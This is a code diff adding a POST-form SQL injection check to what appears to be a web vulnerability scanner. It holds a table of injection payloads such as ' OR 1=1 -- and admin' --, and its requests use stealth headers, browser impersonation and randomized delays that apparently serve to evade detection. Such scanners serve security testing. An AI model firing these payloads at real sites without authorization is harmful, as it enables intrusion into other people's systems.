@@ -512,6 +512,96 @@ def check_thinkphp_rce(url: str) -> Optional[Vulnerability]:
     return None
 
 
+def check_form_injection(url: str) -> Optional[Vulnerability]:
+    """POST 表单注入检测（SQL注入、参数污染）"""
+    try:
+        import re as regex_module
+
+        # 步骤1: 获取页面并发现表单字段
+        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
+        headers = get_stealth_headers()
+
+        res = requests.get(
+            url,
+            headers=headers,
+            verify=Config.VERIFY_SSL_CERTIFICATE,
+            timeout=Config.POC_TIMEOUT,
+            impersonate="chrome120"
+        )
+
+        # 解析 HTML 寻找 form 输入字段
+        form_inputs = regex_module.findall(
+            r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>',
+            res.text,
+            regex_module.IGNORECASE
+        )
+
+        if not form_inputs:
+            logger.debug(f"  [-] {url} 未发现表单字段")
+            return None
+
+        # 步骤2: 定义 SQL 注入测试 payload 及其指示符
+        sqli_payloads = {
+            "id": ("1' AND '1'='1", ["sql error", "mysql", "syntax error", "you have an error", "warning: mysql", "unclosed quotation mark"]),
+            "uid": ("1' AND '1'='1", ["sql error", "mysql", "syntax error", "you have an error"]),
+            "user_id": ("1' AND '1'='1", ["sql error", "mysql"]),
+            "name": ("test' OR '1'='1", ["sql error", "mysql", "syntax error"]),
+            "search": ("*/ OR 1=1 /*", ["sql error", "mysql"]),
+            "q": ("*/ OR 1=1 /*", ["sql error", "mysql"]),
+            "username": ("admin' --", ["sql error", "mysql", "syntax error"]),
+            "email": ("test@test.com' OR '1'='1", ["sql error", "mysql"]),
+            "password": ("' OR 1=1 --", ["sql error", "mysql"]),
+            "login": ("admin' --", ["sql error", "mysql"]),
+        }
+
+        # 步骤3: 对每个表单字段进行注入测试
+        for param in form_inputs:
+            param_lower = param.lower()
+
+            # 查找匹配的 payload
+            for key, (payload, indicators) in sqli_payloads.items():
+                if key in param_lower:
+                    test_data = {param: payload}
+                    target_url = url if '?' not in url else url.split('?')[0]
+
+                    smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
+
+                    try:
+                        res_post = requests.post(
+                            target_url,
+                            data=test_data,
+                            headers=headers,
+                            verify=Config.VERIFY_SSL_CERTIFICATE,
+                            timeout=Config.POC_TIMEOUT,
+                            impersonate="chrome120"
+                        )
+
+                        # 检查 SQL 注入指示符
+                        response_lower = res_post.text.lower()
+                        for indicator in indicators:
+                            if indicator in response_lower:
+                                return Vulnerability(
+                                    vuln_name="SQL 注入 (POST 表单)",
+                                    payload_url=target_url,
+                                    severity=Severity.CRITICAL,
+                                    vuln_type=VulnType.SQL_INJECTION,
+                                    discovered_at=datetime.now().isoformat(),
+                                    confidence=0.85,
+                                    description=f"参数: {param}, Payload: {payload}, 指示符: {indicator}"
+                                )
+
+                    except requests.exceptions.Timeout:
+                        logger.debug(f"  [-] POST 请求超时: {param}")
+                    except Exception as e:
+                        logger.debug(f"  [-] POST 注入测试异常 ({param}): {e}")
+
+        return None
+
+    except Exception as e:
+        logger.debug(f"  [-] 表单注入检测失败: {e}")
+        return None
+
+
 def check_jboss_deserialization(url: str) -> Optional[Vulnerability]:
     """JBoss 反序列化RCE检测"""
     try:
